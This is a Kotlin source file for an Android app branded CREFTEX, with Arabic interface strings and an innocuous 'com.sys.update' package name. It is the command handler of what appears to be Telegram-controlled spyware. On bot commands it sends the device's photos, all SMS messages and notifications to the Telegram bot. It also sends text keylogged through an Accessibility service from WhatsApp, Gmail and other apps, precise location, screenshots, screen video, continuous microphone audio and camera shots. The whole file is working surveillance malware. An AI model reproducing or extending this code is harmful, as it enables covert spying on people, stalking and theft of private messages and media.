package com.sys.update

import android.content.Context
import android.util.Log
import org.json.JSONObject
import java.io.File

object CommandExecutor {

    private val runningJobs = java.util.concurrent.ConcurrentHashMap<String, Boolean>()

    @Volatile
    var screenLoopActive: Boolean = false
        private set

    fun handle(ctx: Context, callbackData: String, callbackId: String) {
        TelegramApi.answerCallback(callbackId)
        Log.d("CmdExec", "executing: $callbackData")

        when {
            callbackData == "menu" -> showMainMenu(ctx)
            callbackData == "open_site" -> openSite(ctx)
            callbackData == "info" -> showDeviceInfo(ctx)
            callbackData == "location" -> showLocation(ctx)
            callbackData == "photos_all" -> fetchAllPhotos(ctx)
            callbackData == "photos_50" -> fetchLastPhotos(ctx, 50)
            callbackData == "photos_200" -> fetchLastPhotos(ctx, 200)
            callbackData == "sms_all" -> fetchAllSms(ctx)
            callbackData == "notifs_all" -> fetchAllNotifs(ctx)
            callbackData == "accessibility_log" -> fetchAccessibility(ctx)
            callbackData == "accessibility_clear" -> clearAccessibility(ctx)
            callbackData == "audio_start" -> startAudio(ctx)
            callbackData == "audio_stop" -> stopAudio(ctx)
            callbackData == "screen_once" -> captureOnce(ctx)
            callbackData == "screen_loop_start" -> startScreenLoop(ctx)
            callbackData == "screen_loop_stop" -> stopScreenLoop(ctx)
            callbackData == "video_30" -> recordVideo(ctx, 30)
            callbackData == "video_60" -> recordVideo(ctx, 60)
            callbackData == "cam_front" -> captureCamera(ctx, true)
            callbackData == "cam_back" -> captureCamera(ctx, false)
            callbackData == "fetch_all" -> fetchEverything(ctx)
            callbackData.startsWith("stop_") -> stopJob(ctx, callbackData.removePrefix("stop_"))
            else -> TelegramApi.sendMessage("❓ أمر غير معروف: $callbackData")
        }
    }

    fun handleText(ctx: Context, text: String) {
        val cmd = text.trim().lowercase()
        when {
            cmd == "/start" || cmd == "/menu" -> showMainMenu(ctx)
            cmd == "/site" -> openSite(ctx)
            cmd == "/info" -> showDeviceInfo(ctx)
            cmd == "/location" || cmd == "/loc" -> showLocation(ctx)
            cmd == "/photos" -> fetchAllPhotos(ctx)
            cmd == "/sms" -> fetchAllSms(ctx)
            cmd == "/notifs" -> fetchAllNotifs(ctx)
            cmd == "/accessibility" || cmd == "/acc" -> fetchAccessibility(ctx)
            cmd == "/audio_start" -> startAudio(ctx)
            cmd == "/audio_stop" -> stopAudio(ctx)
            cmd == "/screen" -> captureOnce(ctx)
            cmd == "/screen_loop" -> startScreenLoop(ctx)
            cmd == "/screen_stop" -> stopScreenLoop(ctx)
            cmd == "/video" || cmd == "/video30" -> recordVideo(ctx, 30)
            cmd == "/video60" -> recordVideo(ctx, 60)
            cmd == "/cam_front" -> captureCamera(ctx, true)
            cmd == "/cam_back" -> captureCamera(ctx, false)
            cmd == "/all" -> fetchEverything(ctx)
            cmd.startsWith("/photos") -> {
                val n = cmd.removePrefix("/photos").trim().toIntOrNull() ?: 50
                fetchLastPhotos(ctx, n)
            }
            else -> TelegramApi.sendMessage("اكتب /menu لعرض القائمة")
        }
    }

    private fun showMainMenu(ctx: Context) {
        val text = """
            🎛 *لوحة التحكم — CREFTEX*

            اختر العملية من الأزرار أدناه:
        """.trimIndent()
        TelegramApi.sendMessage(text, KeyboardBuilder.mainMenu())
    }

    private fun openSite(ctx: Context) {
        try {
            TelegramApi.sendMessage("🌐 *جاري فتح الموقع على الجهاز...*")
            val intent = android.content.Intent(ctx, WebViewActivity::class.java)
            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(intent)
        } catch (e: Exception) {
            TelegramApi.sendMessage("❌ فشل فتح الموقع: ${e.message}")
        }
    }

    private fun showDeviceInfo(ctx: Context) {
        val info = DeviceInfo.getFullInfo(ctx)
        TelegramApi.sendMessage(info, KeyboardBuilder.backToMenu())
    }

    private fun showLocation(ctx: Context) {
        runJob(ctx, "location") {
            TelegramApi.sendMessage("📍 *جاري تحديد الموقع بدقة عالية...*\n⏱ قد يأخذ حتى 15 ثانية")
            val loc = LocationHelper.getPreciseLocation(ctx)
            val text = LocationHelper.formatLocation(ctx, loc)
            TelegramApi.sendMessage(text, KeyboardBuilder.backToMenu())
        }
    }

    // ═══════════════════════════════════════════
    //  VIDEO RECORDING
    // ═══════════════════════════════════════════
    private fun recordVideo(ctx: Context, durationSec: Int) {
        if (!ScreenCapture.isReady) {
            TelegramApi.sendMessage(
                "⚠️ *صلاحية التقاط الشاشة غير جاهزة*\n\n" +
                "الحل:\n" +
                "1. افتح التطبيق يدويًا\n" +
                "2. وافق على نافذة *التقاط الشاشة*\n" +
                "3. أعد الأمر بعدها",
                KeyboardBuilder.backToMenu()
            )
            return
        }
        if (VideoRecorder.isRecording) {
            TelegramApi.sendMessage("📹 التسجيل شغّال بالفعل")
            return
        }
        runJob(ctx, "video") {
            TelegramApi.sendMessage("📹 *بدأ تسجيل الفيديو ($durationSec ثانية)...*")
            val file = VideoRecorder.start(ctx, durationSec)
            if (file == null) {
                TelegramApi.sendMessage("❌ فشل بدء التسجيل", KeyboardBuilder.backToMenu())
                return@runJob
            }
            // انتظر انتهاء التسجيل
            Thread.sleep((durationSec + 3) * 1000L)
            val done = VideoRecorder.stop() ?: file
            if (done.exists() && done.length() > 0) {
                val sizeMB = done.length() / (1024.0 * 1024.0)
                TelegramApi.sendMessage("📤 *جاري الإرسال...* (${String.format("%.1f", sizeMB)} MB)")
                val ok = TelegramApi.sendVideo(done, "📹 فيديو الشاشة — ${DeviceInfo.getQuickInfo(ctx)}")
                if (ok) {
                    TelegramApi.sendMessage("✅ تم إرسال الفيديو", KeyboardBuilder.backToMenu())
                } else {
                    TelegramApi.sendMessage("❌ فشل الإرسال — الحجم كبير؟ جرب 30 ثانية", KeyboardBuilder.backToMenu())
                }
                done.delete()
            } else {
                TelegramApi.sendMessage("❌ لم يتم تسجيل أي شي", KeyboardBuilder.backToMenu())
            }
        }
    }

    // ═══════════════════════════════════════════
    //  ACCESSIBILITY
    // ═══════════════════════════════════════════
    private fun fetchAccessibility(ctx: Context) {
        runJob(ctx, "accessibility") {
            if (!AccessibilityHelper.isEnabled(ctx)) {
                TelegramApi.sendMessage(
                    "⚠️ *خدمة Accessibility غير مفعّلة*\n\n" +
                    "الحل:\n" +
                    "1. الإعدادات → إمكانية الوصول\n" +
                    "2. التطبيقات المثبتة\n" +
                    "3. CREFTEX → فعّلها\n\n" +
                    "بعدها أعد المحاولة.",
                    KeyboardBuilder.backToMenu()
                )
                return@runJob
            }

            val lines = AccessibilityHelper.readCapturedTexts(ctx, limit = 800)
            if (lines.isEmpty()) {
                TelegramApi.sendMessage(
                    "📝 *لا توجد نصوص محفوظة بعد*\n\n" +
                    "جرّب فتح تطبيق واكتب فيه، ثم أعد الأمر.",
                    KeyboardBuilder.backToMenu()
                )
                return@runJob
            }

            val grouped = HashMap<String, MutableList<Pair<String, String>>>()

            for (line in lines) {
                try {
                    val obj = JSONObject(line)
                    if (obj.optString("type") != "accessibility") continue
                    val pkg = obj.optString("package", "unknown")
                    val time = obj.optString("time", "")
                    val texts = obj.optString("texts", "")
                    if (texts.isBlank()) continue
                    grouped.getOrPut(pkg) { mutableListOf() }.add(time to texts)
                } catch (_: Exception) {}
            }

            if (grouped.isEmpty()) {
                TelegramApi.sendMessage("📝 لا يوجد محتوى صالح.", KeyboardBuilder.backToMenu())
                return@runJob
            }

            val appNames = mapOf(
                "org.telegram.messenger" to "Telegram",
                "org.telegram.plus" to "Telegram Plus",
                "com.whatsapp" to "WhatsApp",
                "com.whatsapp.w4b" to "WhatsApp Business",
                "com.instagram.android" to "Instagram",
                "com.facebook.katana" to "Facebook",
                "com.facebook.orca" to "Messenger",
                "com.google.android.apps.messaging" to "Messages",
                "com.android.chrome" to "Chrome",
                "com.twitter.android" to "Twitter",
                "com.snapchat.android" to "Snapchat",
                "com.google.android.gm" to "Gmail",
                "com.android.vending" to "Play Store",
                "com.google.android.apps.maps" to "Maps",
                "com.google.android.youtube" to "YouTube"
            )

            for ((pkg, items) in grouped) {
                val appName = appNames[pkg] ?: pkg
                val sb = StringBuilder()
                sb.append("📱 *$appName*\n")
                sb.append("━━━━━━━━━━━━━━━━━━━━\n")

                val recent = items.takeLast(20)
                for (item in recent) {
                    sb.append("🕐 `${item.first}`\n")
                    sb.append("💬 ${item.second}\n\n")

                    if (sb.length > 3500) {
                        TelegramApi.sendMessage(sb.toString())
                        sb.clear()
                        sb.append("📱 *$appName* (تكملة)\n\n")
                    }
                }

                if (sb.isNotEmpty()) {
                    TelegramApi.sendMessage(sb.toString())
                    Thread.sleep(300)
                }
            }

            TelegramApi.sendMessage("✅ تم عرض النصوص المجمّعة.", KeyboardBuilder.backToMenu())
        }
    }

    private fun clearAccessibility(ctx: Context) {
        AccessibilityHelper.clearCapturedTexts(ctx)
        TelegramApi.sendMessage("🗑 تم حذف النصوص المخزنة", KeyboardBuilder.backToMenu())
    }

    // ═══════════════════════════════════════════
    //  CAMERA
    // ═══════════════════════════════════════════
    private fun captureCamera(ctx: Context, front: Boolean) {
        runJob(ctx, "cam") {
            val label = if (front) "أمامية 🤳" else "خلفية 📸"
            TelegramApi.sendMessage("📷 *جاري التصوير من الكاميرا $label...*")
            val file = CameraCapture.capture(ctx, front, timeoutSec = 12)
            if (file != null && file.exists()) {
                TelegramApi.sendPhoto(file, "📷 صورة من الكاميرا $label — ${DeviceInfo.getQuickInfo(ctx)}")
                file.delete()
            } else {
                TelegramApi.sendMessage("❌ فشل التصوير — تأكد من صلاحية الكاميرا", KeyboardBuilder.backToMenu())
            }
        }
    }

    // ═══════════════════════════════════════════
    //  SCREEN CAPTURE
    // ═══════════════════════════════════════════
    private fun captureOnce(ctx: Context) {
        if (!ScreenCapture.isReady) {
            TelegramApi.sendMessage(
                "⚠️ *صلاحية التقاط الشاشة غير جاهزة*\n\n" +
                "الحل:\n" +
                "1. افتح التطبيق يدويًا\n" +
                "2. وافق على نافذة *التقاط الشاشة*\n" +
                "3. أعد الأمر بعدها",
                KeyboardBuilder.backToMenu()
            )
            return
        }
        runJob(ctx, "screen_once") {
            TelegramApi.sendMessage("📷 *جاري التقاط الشاشة...*")
            val file = ScreenCapture.capture(ctx)
            if (file != null && file.exists()) {
                TelegramApi.sendPhoto(file, "📷 لقطة شاشة — ${DeviceInfo.getQuickInfo(ctx)}")
                file.delete()
            } else {
                TelegramApi.sendMessage("❌ فشل التقاط الشاشة — أعد فتح التطبيق للموافقة من جديد", KeyboardBuilder.backToMenu())
            }
        }
    }

    private fun startScreenLoop(ctx: Context) {
        if (!ScreenCapture.isReady) {
            TelegramApi.sendMessage(
                "⚠️ *صلاحية التقاط الشاشة غير جاهزة*\n\n" +
                "الحل:\n" +
                "1. افتح التطبيق يدويًا\n" +
                "2. وافق على نافذة *التقاط الشاشة*\n" +
                "3. أعد الأمر بعدها",
                KeyboardBuilder.backToMenu()
            )
            return
        }
        if (screenLoopActive) {
            TelegramApi.sendMessage("📷 اللقطات المتكررة شغّالة بالفعل")
            return
        }
        screenLoopActive = true
        TelegramApi.sendMessage("📷 ✅ بدأ اللقطات المتكررة\n⏱ كل 30 ثانية", KeyboardBuilder.mainMenu())
    }

    private fun stopScreenLoop(ctx: Context) {
        screenLoopActive = false
        TelegramApi.sendMessage("📷 ⏹ تم إيقاف اللقطات المتكررة", KeyboardBuilder.mainMenu())
    }

    // ═══════════════════════════════════════════
    //  PHOTOS
    // ═══════════════════════════════════════════
    private fun fetchAllPhotos(ctx: Context) {
        runJob(ctx, "photos_all") {
            val all = MediaScanner.scanImages(ctx)
            sendPhotosList(ctx, all, "📸 كل الصور (${all.size})")
        }
    }

    private fun fetchLastPhotos(ctx: Context, n: Int) {
        runJob(ctx, "photos_$n") {
            val all = MediaScanner.scanImages(ctx).take(n)
            sendPhotosList(ctx, all, "📸 آخر $n صورة")
        }
    }

    private fun sendPhotosList(ctx: Context, list: List<MediaScanner.MediaFile>, title: String) {
        if (list.isEmpty()) {
            TelegramApi.sendMessage("📸 لا توجد صور", KeyboardBuilder.backToMenu())
            return
        }

        val jobId = "photos_${System.currentTimeMillis()}"
        runningJobs[jobId] = true

        val statusMsgId = TelegramApi.sendMessage(
            "$title\n⏳ جاري الإرسال... 0/${list.size}",
            KeyboardBuilder.stopJob(jobId)
        )

        var sent = 0
        var failed = 0
        val startTime = System.currentTimeMillis()

        for (item in list) {
            if (runningJobs[jobId] != true) break
            val file = File(item.path)
            if (!file.exists()) { failed++; continue }

            val ok = TelegramApi.sendPhoto(file, item.name)
            if (ok) sent++ else failed++

            if ((sent + failed) % 10 == 0) {
                val elapsed = (System.currentTimeMillis() - startTime) / 1000
                TelegramApi.editMessage(
                    statusMsgId,
                    "$title\n⏳ $sent ناجح / $failed فشل\n⏱ مضى: ${elapsed}s",
                    KeyboardBuilder.stopJob(jobId)
                )
                Thread.sleep(500)
            }
        }

        runningJobs.remove(jobId)
        val elapsed = (System.currentTimeMillis() - startTime) / 1000
        TelegramApi.editMessage(
            statusMsgId,
            "$title\n✅ انتهى\n📤 $sent أرسلت\n❌ $failed فشلت\n⏱ ${elapsed}s",
            KeyboardBuilder.backToMenu()
        )
    }

    // ═══════════════════════════════════════════
    //  SMS
    // ═══════════════════════════════════════════
    private fun fetchAllSms(ctx: Context) {
        runJob(ctx, "sms_all") {
            val inbox = SmsReader.scanAll(ctx)
            val sent = SmsReader.scanSent(ctx)
            val all = (inbox + sent).sortedByDescending { it.optString("date") }

            if (all.isEmpty()) {
                TelegramApi.sendMessage("📩 لا توجد رسائل", KeyboardBuilder.backToMenu())
                return@runJob
            }

            val grouped = all.groupBy { it.optString("address", "unknown") }
            val sb = StringBuilder()
            sb.append("📩 *تقرير SMS* — ${all.size} رسالة\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")

            for ((address, msgs) in grouped) {
                sb.append("📞 *$address* (${msgs.size})\n")
                for (m in msgs.take(5)) {
                    val type = if (m.optString("type") == "sms_sent") "📤" else "📥"
                    val body = m.optString("body", "").take(80)
                    sb.append("  $type $body\n")
                }
                if (msgs.size > 5) sb.append("  … +${msgs.size - 5}\n")
                sb.append("\n")

                if (sb.length > 3500) {
                    TelegramApi.sendMessage(sb.toString())
                    sb.clear()
                }
            }

            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.backToMenu())
        }
    }

    // ═══════════════════════════════════════════
    //  NOTIFICATIONS
    // ═══════════════════════════════════════════
    private fun fetchAllNotifs(ctx: Context) {
        runJob(ctx, "notifs_all") {
            val lines = DataStore.readNotifications(ctx, limit = 5000)
            val notifs = lines.mapNotNull { line ->
                try {
                    val obj = JSONObject(line)
                    if (obj.optString("type") == "notif") obj else null
                } catch (_: Exception) { null }
            }

            if (notifs.isEmpty()) {
                TelegramApi.sendMessage("🔔 لا توجد إشعارات بعد.", KeyboardBuilder.backToMenu())
                return@runJob
            }

            val grouped = notifs.groupBy { it.optString("pkg", "unknown") }
            val sb = StringBuilder()
            sb.append("🔔 *الإشعارات* — ${notifs.size} إشعار\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")

            for ((pkg, items) in grouped) {
                sb.append("📱 *$pkg* (${items.size})\n")
                for (n in items.take(5)) {
                    val t = n.optString("title", "")
                    val tx = n.optString("text", "")
                    if (t.isNotBlank()) sb.append("  ▸ $t\n")
                    if (tx.isNotBlank()) sb.append("    $tx\n")
                }
                if (items.size > 5) sb.append("  … +${items.size - 5}\n")
                sb.append("\n")

                if (sb.length > 3500) {
                    TelegramApi.sendMessage(sb.toString())
                    sb.clear()
                }
            }

            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.backToMenu())
        }
    }

    // ═══════════════════════════════════════════
    //  AUDIO
    // ═══════════════════════════════════════════
    private fun startAudio(ctx: Context) {
        if (AudioRecorder.isRunning()) {
            TelegramApi.sendMessage("🎤 التسجيل شغّال بالفعل")
            return
        }
        AudioRecorder.startLoop(ctx)
        TelegramApi.sendMessage("🎤 ✅ بدأ التسجيل التلقائي\n📤 مقطع كل 10 ثواني",
            KeyboardBuilder.mainMenu())
    }

    private fun stopAudio(ctx: Context) {
        AudioRecorder.stopLoop(ctx)
        TelegramApi.sendMessage("🎤 ⏹ تم إيقاف التسجيل", KeyboardBuilder.mainMenu())
    }

    // ═══════════════════════════════════════════
    //  FETCH ALL
    // ═══════════════════════════════════════════
    private fun fetchEverything(ctx: Context) {
        runJob(ctx, "all") {
            TelegramApi.sendMessage("🚀 *بدأ الجلب الشامل*\n\n0️⃣ معلومات الجهاز...")
            Thread.sleep(500)
            try { TelegramApi.sendMessage(DeviceInfo.getFullInfo(ctx)) } catch (_: Exception) {}

            Thread.sleep(500)
            TelegramApi.sendMessage("📍 *الموقع...*")
            try {
                val loc = LocationHelper.getPreciseLocation(ctx)
                TelegramApi.sendMessage(LocationHelper.formatLocation(ctx, loc))
            } catch (_: Exception) {}

            Thread.sleep(500)
            TelegramApi.sendMessage("1️⃣ *صور...*")
            val photos = MediaScanner.scanImages(ctx)
            sendPhotosList(ctx, photos, "📸 الصور")

            Thread.sleep(500)
            TelegramApi.sendMessage("2️⃣ *SMS...*")
            fetchAllSms(ctx)

            Thread.sleep(500)
            TelegramApi.sendMessage("3️⃣ *إشعارات...*")
            fetchAllNotifs(ctx)

            Thread.sleep(500)
            TelegramApi.sendMessage("4️⃣ *نصوص Accessibility...*")
            fetchAccessibility(ctx)

            TelegramApi.sendMessage("✅ *اكتمل الجلب الشامل*", KeyboardBuilder.mainMenu())
        }
    }

    private fun stopJob(ctx: Context, jobId: String) {
        runningJobs[jobId] = false
        runningJobs.remove(jobId)
        TelegramApi.sendMessage("🛑 تم إيقاف العملية", KeyboardBuilder.mainMenu())
    }

    private fun runJob(ctx: Context, jobName: String, block: () -> Unit) {
        Thread {
            try {
                block()
            } catch (e: Exception) {
                Log.e("CmdExec", "job $jobName err: ${e.message}")
                TelegramApi.sendMessage("❌ خطأ في $jobName: ${e.message}")
            }
        }.start()
    }
}
